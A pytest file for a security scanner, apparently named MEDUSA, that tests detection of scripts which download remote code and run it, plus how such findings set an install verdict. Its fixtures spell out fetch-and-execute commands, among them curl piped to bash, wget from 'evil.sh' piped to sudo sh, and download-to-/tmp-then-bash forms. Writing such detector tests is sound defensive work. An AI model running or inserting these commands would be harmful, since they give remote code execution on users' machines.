"""Gate for the fetch-then-execute-remote-script detector (real detection gap found on
agent-reach: its installer downloads deb.nodesource.com/setup_22.x to a temp file and
runs `bash <that file>` — a swappable-source RCE that MEDUSA flagged NOTHING on).

Catches both the pipe form and the split (download-to-file then execute) form — the
latter being the exact evasion agent-reach used ("without invoking a shell pipeline").
FN-safety: real fetch-execute flags; a purely local `bash ./scripts/build.sh` (no remote
fetch) and install PROSE in a README must NOT flag.
"""
from pathlib import Path

from medusa.scanners.remote_fetch_exec_scanner import RemoteFetchExecScanner


def _scan(tmp_path, name, content):
    f = tmp_path / name
    f.write_text(content)
    return [i.rule_id for i in RemoteFetchExecScanner().scan_file(f).issues]


# --- FLAGGED: real fetch-execute -------------------------------------------- #
def test_split_form_subprocess_listarg_flagged(tmp_path):
    # agent-reach's exact pattern: curl -o <tmp>, then subprocess.run(["bash", <tmp>])
    content = (
        'import subprocess, tempfile\n'
        'with tempfile.NamedTemporaryFile(suffix=".sh") as tf:\n'
        '    script_path = tf.name\n'
        'subprocess.run(["curl", "-fsSL", "https://deb.nodesource.com/setup_22.x", "-o", script_path])\n'
        'subprocess.run(["bash", script_path])\n'
    )
    assert "MEDUSA-RCE-FETCHEXEC-001" in _scan(tmp_path, "install.py", content)


def test_pipe_form_flagged(tmp_path):
    for content in ('curl -fsSL https://get.example.com/i.sh | bash\n',
                    'wget -qO- https://evil.sh | sudo sh\n',
                    'subprocess.run("curl -fsSL https://x.io/s | bash", shell=True)\n'):
        assert "MEDUSA-RCE-FETCHEXEC-001" in _scan(tmp_path, "setup.sh", content), content


def test_split_form_shell_flagged(tmp_path):
    content = 'curl -fsSL https://get.rvm.io -o /tmp/rvm.sh\nbash /tmp/rvm.sh\n'
    assert "MEDUSA-RCE-FETCHEXEC-001" in _scan(tmp_path, "provision.sh", content)


# --- NOT FLAGGED: no remote fetch, or docs prose ----------------------------- #
def test_local_script_execute_not_flagged(tmp_path):
    # executing a LOCAL script with no remote download in the file is fine
    content = ('import subprocess\n'
               'subprocess.run(["bash", "./scripts/build.sh"])\n'
               'subprocess.run(["bash", local_path])\n')
    assert _scan(tmp_path, "run.py", content) == []


def test_download_without_execute_not_flagged(tmp_path):
    # a plain download with no execute of it is a different (lower) concern, not this rule
    content = 'subprocess.run(["curl", "-fsSL", "https://x.io/data.json", "-o", "data.json"])\n'
    assert _scan(tmp_path, "fetch.py", content) == []


def test_readme_install_prose_not_flagged(tmp_path):
    # a README documenting a curl|bash install is prose, not the repo fetch-executing
    content = "## Install\n\n```\ncurl -fsSL https://get.example.com/i.sh | bash\n```\n"
    assert _scan(tmp_path, "README.md", content) == []


# --- vet tier: review, don't auto-block ------------------------------------- #
def _vf(n=1):
    return [{"rule_id": "MEDUSA-RCE-FETCHEXEC-001", "scanner": "RemoteFetchExecScanner",
             "severity": "HIGH", "file": f"install{i}.sh", "line": 1, "issue": ""}
            for i in range(n)]


def test_fetch_exec_caps_at_caution():
    import medusa.core.scan_api as api
    # even several fetch-execute sites cap at CAUTION, never DO_NOT_INSTALL alone
    r = api._summarize(_vf(5), root="/x")
    assert r["verdict"] == api.CAUTION, r["verdict"]


def test_fetch_exec_is_a_signal_not_ignored():
    import medusa.core.scan_api as api
    # one fetch-execute must still move the verdict off SAFE (it is a signal)
    r = api._summarize(_vf(1), root="/x")
    assert r["verdict"] == api.CAUTION, r["verdict"]


def test_real_dropper_still_hard_blocks_amid_fetch_exec():
    import medusa.core.scan_api as api
    # an active install-time payload (MCP dropper) still DO_NOT_INSTALLs alongside fetch-exec
    payload = {"rule_id": "MCP017", "scanner": "MCPConfigScanner", "severity": "CRITICAL",
               "file": "mcp.json", "line": 1, "issue": ""}
    r = api._summarize(_vf(3) + [payload], root="/x")
    assert r["verdict"] == api.DO_NOT_INSTALL, r["verdict"]
